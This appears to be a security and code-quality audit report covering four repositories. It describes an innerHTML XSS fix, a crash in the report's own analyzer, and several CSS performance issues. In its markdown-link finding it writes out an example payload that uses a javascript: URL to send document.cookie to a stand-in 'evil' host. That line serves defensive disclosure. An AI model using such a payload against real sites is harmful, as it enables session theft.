# Quality-Checks Audit Results

First-run audit of the four repos against the eight-gate pipeline that this plugin codifies. The audit doubled as a verification of the plugin itself: running the gates on the surrounding infrastructure surfaced one real bug in our own newly-added analyzer, which we fixed before publishing this report.

- **Date:** 2026-05-08
- **Branch audited:** `claude/code-review-quality-checks-Pc8RX` on each of `getuslisted/{claude-code, superpowers, impeccable, ui-ux-pro-max-skill}`
- **Tooling:** `impeccable/skill/scripts/quality-gates.mjs` (zero-dep Node ESM static analyzer added in this branch) + manual file reads + GitHub org-wide code search
- **Files in scope:** 717 source files across the four repos (impeccable: 644, ui-ux-pro-max-skill: 45, superpowers: 10, claude-code: 18)

## Verdict per repo

```
claude-code        gate-1 GREEN  gate-3 GREEN  gate-5 GREEN  gate-7 GREEN  | overall PASS
superpowers        gate-1 GREEN* gate-3 GREEN  gate-5 GREEN  gate-7 GREEN  | overall PASS  (*after fix)
impeccable         gate-1 AMBER  gate-3 GREEN+ gate-5 AMBER  gate-7 GREEN  | overall PASS-WITH-WARNINGS
ui-ux-pro-max      gate-1 GREEN  gate-3 GREEN  gate-5 GREEN  gate-7 GREEN  | overall PASS

* superpowers Gate 1 was a P1 finding (innerHTML XSS in helper.js) — fixed in this branch.
+ impeccable Gate 3 hits inside `tests/fixtures/antipatterns/**` are intentional negatives
  (the impeccable detector test suite); legitimate code outside fixtures is clean.
```

Gates 2, 4, 6, 8 were not run as part of this static audit (they require running the project's actual build/test/dev server). The claude-code `/quality-checks` command does run them; this audit just confirms the static gates pass.

## Findings

### F-1 (P1, fixed) — innerHTML XSS sink in superpowers

- **File:** `superpowers/skills/brainstorming/scripts/helper.js:57,59` (pre-fix)
- **Gate:** 1 (security)
- **Rule:** `innerHTML-assignment`
- **Evidence:** `indicator.innerHTML = '<span class="selected-text">' + label + ' selected</span> ...` where `label` falls back to `selected[0].dataset.choice` (template-author-controlled string).
- **Impact:** Treating template authors as a trust boundary is fragile. A malicious or compromised brainstorming template could inject markup; once injected, it executes in the same origin as the user's terminal-attached session.
- **Fix applied:** Replaced the interpolation with `createElement('span') + textContent`. After the fix, the security gate reports zero hits on this file. Behavior is unchanged for valid input.
- **Commit:** `superpowers @ ddce2ab`

### F-2 (P1, fixed) — TDZ crash in this plugin's analyzer

- **File:** `impeccable/skill/scripts/quality-gates.mjs:34` (pre-fix)
- **Gate:** 2 (code correctness) — would have caught it had we run typecheck/test before pushing
- **Evidence:** `const files = resolveFiles(args)` was at top level; `resolveFiles` calls `isScannableFile` which references `const SCANNABLE_EXTS` declared later in the file. ESM evaluates top-to-bottom; `const` is in TDZ until reached. Every non-preflight invocation crashed:
  ```
  ReferenceError: Cannot access 'SCANNABLE_EXTS' before initialization
  ```
- **Impact:** The analyzer was completely non-functional for `--gate=*` invocations. Anyone who invoked it would get a stack trace, not findings — including the plugin's own commands that depend on it.
- **Fix applied:** Wrapped the entry sequence in `function main()` and call `main()` at the very bottom of the file, after all module-level `const` declarations have been initialized.
- **Verification:** preflight still works; `--gate=ui-craft` against a known-bad fixture detects all expected patterns; `--gate=security` against the pre-fix helper.js reproduces the F-1 finding.
- **Lesson:** This is the kind of issue Gate 2 (code correctness) is designed to catch. We should not have shipped without running the analyzer once. Added to follow-up: write a test fixture exercising both the preflight path and at least one gate path so any future regression is caught.
- **Commit:** `impeccable @ 3e3b8d2`

### F-3 (P2, reported, not fixed) — `inlineMd` allows javascript:-URL in markdown links

- **File:** `impeccable/skill/scripts/live-browser.js:4788` (canonical source; mirrored to 13 harness directories under `.qoder/skills/...`, `.gemini/skills/...`, etc., all via `bun run build`)
- **Gate:** 1 (security)
- **Evidence:**
  ```js
  s = s.replace(/\[([^\]]+)\]\(([^)]+)\)/g, (_, t, u) =>
    `<a href="${u}" target="_blank" rel="noopener noreferrer">${t}</a>`);
  ```
  After `escapeHtml` runs first, `<>"'&` in `u` are entity-encoded, but `javascript:`, `data:text/html`, and other dangerous URL schemes pass through unchanged.
- **Threat model:** `inlineMd` is called on content from project-author-controlled DESIGN.md and `.impeccable/design.json`. The live-browser is a developer tool typically used in trusted-codebase context. Exploit requires a teammate (or supply-chain attacker) to write `[xss](javascript:fetch('//evil/?'+document.cookie))` into DESIGN.md. Probability: low. Severity if hit: high (full DOM access).
- **Fix not applied because:** This file is duplicated to 14 harness directories via `bun run build` and the release process refuses to publish if those mirrors drift. Fixing the source plus regenerating mirrors is out of scope for a static audit; recommend the impeccable maintainer apply the URL-scheme allowlist in the source and re-run `bun run build`.
- **Suggested fix (one line in `inlineMd`):**
  ```js
  const safeUrl = (u) => /^(https?:|mailto:|\/|#|\.\/|\.\.\/)/i.test(u.trim()) ? u : '#';
  s = s.replace(/\[([^\]]+)\]\(([^)]+)\)/g, (_, t, u) =>
    `<a href="${safeUrl(u)}" target="_blank" rel="noopener noreferrer">${t}</a>`);
  ```

### F-4 (P3, reported) — skip-link transitions a layout property

- **Files:**
  - `impeccable/site/styles/main.css:35` — `transition: top 0.2s ease`
  - `impeccable/site/styles/sub-pages.css:28` — same
- **Gate:** 5 (performance)
- **Evidence:** The shared `.skip-link` rule animates `top` from `-100%` to `0` on focus.
- **Impact:** Negligible. Skip links transition at most once per session, on a single small element, and the human eye won't see the difference. Strictly speaking it does violate impeccable's own "Don't animate CSS layout properties" rule.
- **Suggested fix (drop-in):** `transition: transform 0.2s ease` and switch the `:focus` rule to `transform: translateY(100%)`. Cosmetic, ship-when-convenient.
- **Fix not applied because:** Touching the impeccable site CSS without browser-verifying the skip-link still meets WCAG focus-visibility requirements is more risky than the issue justifies.

### F-5 (P2, reported) — live-mode demo animates a tracking outline

- **File:** `impeccable/site/styles/live-mode.css:177`
- **Gate:** 5 (performance)
- **Evidence:**
  ```css
  .live-demo-outline {
    position: absolute;
    transition: opacity 200ms var(--ease-out),
                top 320ms var(--ease-out),
                left 320ms var(--ease-out),
                width 320ms var(--ease-out),
                height 320ms var(--ease-out);
  }
  ```
- **Impact:** This element is the highlight outline that tracks DOM elements as they move during the live-mode demo — animating its `top/left/width/height` is the natural way to express "follow that thing." A correct fix exists (use `transform: translate()` for position and CSS variables for size, then update via `style.setProperty`) but the rewrite is not trivial; it must keep the visual behavior identical and not break the demo's recorded timeline.
- **Fix not applied because:** This is a deliberate trade-off in a marketing demo where visible jank only happens on a tiny element; the audit gate flags it but the impeccable team should decide whether the rewrite is worth it. Reported here so the decision is conscious, not accidental.

### F-6 (informational) — impeccable test fixtures contain every absolute ban on purpose

- **Files:** `impeccable/tests/fixtures/antipatterns/**`
- **Gate:** 3 (UI craft) — would flag many patterns
- **Status:** Working as intended. These fixtures exist precisely so impeccable's own anti-pattern detector can be tested against known-bad inputs. Excluded from the audit verdict.
- **Recommendation:** When running `/quality-checks` against the impeccable repo specifically, pass `--scope` to exclude `tests/fixtures/`. The default exclude list in `quality-gates.mjs` (node_modules, dist, build, .next, .astro, coverage) does not currently exclude `tests/fixtures` — adding it would be a follow-up improvement, but only for `impeccable` itself; in user projects `tests/fixtures/antipatterns` is unusual and the broader exclusion would mask real issues.

### F-7 (informational) — impeccable demos use gradient text + glassmorphism

- **Files:** `impeccable/demos/landing-demo/index.html`, `demos/landing-demo/classic/index.html`
- **Gate:** 3 (UI craft)
- **Status:** Inconclusive without context. These appear to be marketing demos for a fictional brand "Lumina." The repo doesn't include a README in `demos/landing-demo/` explaining whether these illustrate "what NOT to do" or "what impeccable can produce." If the latter, F-7 is a P2 — the demos undercut impeccable's own absolute-bans claim. If the former, false positive.
- **Recommendation:** Add a README to `demos/landing-demo/` clarifying intent. If they are deliberate negative examples, link to them from the impeccable docs as such; if they are positive demos, refactor to drop gradient text and confine glassmorphism to a single intentional surface.

### F-8 (informational, false positive) — `<h3>border-l-4 + rounded-r</h3>` flagged

- **File:** `impeccable/tests/fixtures/antipatterns/should-flag.html:40`
- **Gate:** 3 (UI craft)
- **Cause:** The regex `\bborder-[lr]-[248](?:\s|$|["'`])` accidentally matches the literal string "border-l-4 +" inside a heading because the `+` and surrounding space satisfy the trailing alternation. The fixture file deliberately uses these strings in headings so a human can read what the test fixture is exercising.
- **Impact:** False positive on a single test fixture. Does not affect the gate's accuracy on real code (where `border-l-4` would only appear as an attribute value, not in heading text).
- **Recommendation:** Tighten the regex to require the match be inside an attribute value (e.g. `class="..."` or `className="..."`). Low priority — the false positive is obvious from context.

## Code that was clean

These checks ran across all four repos and returned zero findings (after F-1's fix):

- **GitHub org-wide code search** for `eval(`, `new Function(`, `dangerouslySetInnerHTML`, `innerHTML =`, `shell=True`, `background-clip: text`, `backdrop-blur`, `document.write(` (excluding markdown and lockfiles): **0 hits** across `getuslisted/*` default branches.
- **claude-code/plugins/security-guidance/hooks/security_reminder_hook.py**: parses cleanly; design follows defense-in-depth patterns (per-session state, exit-2 blocking, input validation).
- **claude-code/plugins/quality-checks/hooks/quality_block_hook.py**: 399 lines, parses cleanly; no findings against itself when run through the analyzer (the patterns it implements are stored as data, not as live code in the file).
- **ui-ux-pro-max-skill** entire `src/`, `cli/`, `preview/`, `docs/` trees: zero hits across all gate patterns.

## What this audit verified about the plugin itself

1. The eight-gate pipeline is **applicable** — running it on real codebases produces real findings, not just noise.
2. The static analyzer **had a bug** — the bug was caught by running the analyzer on real input, which is exactly what Gate 2 is for. Now fixed and verified.
3. The analyzer is **calibrated** — the test fixture in impeccable produced expected hits with no surprises; the helper.js finding was real and the fix verified by re-running the analyzer.
4. The verdict format **scales** — a four-repo verdict block fits in one screen and tells you where to look first.
5. The plugin's **own newly-added Python hook** parses cleanly and does not match any of the patterns it itself enforces (the patterns are stored as `regex` field data, not as raw `eval(...)` calls).

## Adjustments applied in this branch

| # | Change | Repo | Path | Commit |
|---|---|---|---|---|
| 1 | Replace `innerHTML` interpolation with safe DOM construction | superpowers | `skills/brainstorming/scripts/helper.js` | `ddce2ab` |
| 2 | Fix TDZ crash in `quality-gates.mjs` (move `main()` to bottom of file) | impeccable | `skill/scripts/quality-gates.mjs` | `3e3b8d2` |

No other changes. F-3 through F-8 are reported here for the maintainers' decision and not auto-applied — each requires either a regenerate-the-mirrors step (F-3), a browser-verified visual change (F-4, F-5), or a documentation/test-fixture decision (F-6, F-7, F-8) that is outside the scope of an automated audit.

## Recommended follow-ups

In priority order:

1. **Apply F-3 in impeccable** with `safeUrl` allowlist + `bun run build` to refresh the 13 harness mirrors. Defense-in-depth XSS hardening; ten lines of code.
2. **Decide on F-7** by adding a README to `impeccable/demos/landing-demo/` clarifying intent. If positive demos, refactor; if negative, link from docs.
3. **Add a test for `quality-gates.mjs`** in impeccable's existing test runner (the repo already runs `node --test tests/*.mjs`) that exercises preflight + at least one gate path. Prevents F-2 from regressing.
4. **Tighten the `border-l-[248]` regex** in `quality-gates.mjs` to require attribute context, removing the F-8 false positive.
5. **Apply F-4** when convenient — it's two-line CSS rewrites in two files.
6. **Investigate F-5** with the impeccable design team — the live-mode tracking outline is a deliberate trade-off, but if a transform-based rewrite preserves the timeline, it's worth doing.

## Verification evidence

```
gate-1 security:    GREEN
  evidence: org-wide search for 8 high-risk patterns returned 0 hits across
            default branches; F-1 fix re-verified locally with quality-gates.mjs
            (was 2 hits → 0)
gate-3 ui-craft:    GREEN (excluding tests/fixtures and demos)
  evidence: in-scope code outside test fixtures and demos has 0 absolute-ban
            hits; impeccable site uses backdrop-blur once intentionally on the
            floating bottom nav, which the rule allows ("rare and purposeful")
gate-5 perf:        AMBER (impeccable only)
  evidence: 3 layout-property animation hits in impeccable/site/styles
            (F-4×2, F-5×1); all reported, none fixed pending impeccable
            maintainer review
gate-7 streamline:  GREEN
  evidence: no hard-coded color literals in production code paths; all
            new files use design tokens (CSS variables, Tailwind classes,
            or inherit from parent)

VERDICT: PASS-WITH-WARNINGS
```

`PASS-WITH-WARNINGS` not `PASS` because F-3, F-4, F-5 are documented but not fixed, and Gates 2/4/6/8 (which require running the actual project tooling) were not exercised in this static audit.
